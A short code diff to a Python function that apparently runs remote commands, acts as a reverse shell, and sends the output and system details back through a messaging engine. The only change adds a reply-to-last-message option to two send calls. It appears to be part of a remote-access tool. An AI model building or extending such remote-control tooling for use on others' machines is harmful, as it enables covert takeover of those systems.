@@ -30,7 +30,7 @@ def shell(context: Context) -> str:
     if len(context.command) > 0:
         res = __runcommand_in_thread(context.command, engine)
         if res != None:
-            engine.send(res, context.system_info(minimal=True))
+            engine.send(res, context.system_info(minimal=True), reply_to_last_message=True)
         return
 
     repeat = 0
@@ -38,7 +38,7 @@ def shell(context: Context) -> str:
     sleep_time = 2
     exit_code = "TIME_OUT"
 
-    engine.send(f"start reverse shell\nfor EXIT send `\exit`", context.system_info())
+    engine.send(f"start reverse shell\nfor EXIT send `\exit`", context.system_info(), reply_to_last_message=True)
 
     while repeat < time_out:
 
